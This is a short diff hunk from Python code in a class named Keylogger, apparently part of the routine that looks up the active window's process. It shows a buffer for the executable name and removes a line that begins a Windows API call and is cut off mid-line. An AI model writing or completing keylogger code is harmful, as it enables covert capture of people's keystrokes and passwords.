@@ -56,4 +56,3 @@ class Keylogger:
         process_id = f"{pid.value}"
 
         executable = create_string_buffer(512)
-        h_process = windll
